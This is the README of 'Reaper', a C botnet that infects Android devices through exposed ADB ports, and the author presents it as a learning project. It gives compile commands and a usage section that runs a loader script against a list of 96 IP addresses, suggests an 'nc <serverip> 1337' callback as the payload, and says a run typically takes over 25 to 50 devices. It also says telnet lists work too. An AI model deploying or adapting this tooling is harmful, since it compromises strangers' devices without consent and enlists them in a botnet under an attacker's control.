    Reaper - An ADB-based botnet written in C.
</h1>
<p align="center">
	Reaper is an ADB-based botnet that lets you control the devices you infect, execute commands, and contains extra tools for playing around. It isn't just limited 
	to ADB, it can be used as a telnet botnet, or a regular botnet.

## Why?

Here are few reasons why I made this:
```
- I wanted to learn more about botnets.
- I wanted to make something that will help other people understand and learn more about botnets.
- I wanted to make my own from scratch, because most botnets that are available on github are all variants of mirai or qbot.
```
Extra Facts:
```
- Yes, I know, I could've used epoll, but I didn't want to make things super-complicated and annoying.
- No, this does not contain any DDoS methods, If you want to customize this and add your own, then you are free to do so.
```

## Installation
```
gcc -o reaper reaper.c -lpthread -lcurl
gcc -o client client.c
```

## Usage
After you have authenticated with the botnet and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices. Please remember, you don't have to limit yourself to only android devices, if you want to use a telnet list, it will also work.
